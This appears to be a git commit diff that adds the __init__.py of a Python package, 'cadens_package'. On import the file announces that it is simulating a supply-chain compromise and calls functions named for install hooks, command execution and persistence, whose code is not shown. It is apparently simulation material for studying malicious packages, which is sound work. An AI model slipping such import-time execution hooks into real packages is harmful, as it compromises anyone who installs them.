6d34138dbd53deffbbd8d56465020903fbca3022
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2025-11-18 20:07:01 +0000

    Add package cadens-package/0.2.0/cadens_package-0.2.0.tar.gz

---
+++ packages/cadens-package/cadens_package-0.2.0.tar.gz/cadens_package-0.2.0/cadens_package/__init__.py
@@ -0,0 +1,11 @@
+from .core import *
+import os
+import subprocess
+
+__all__ = ["make_name_caden"]
+
+print("[cadens_package] Import hook triggered (simulating supply-chain compromise).")
+
+showInstallHook()
+commandExecution()
+persistCommands()
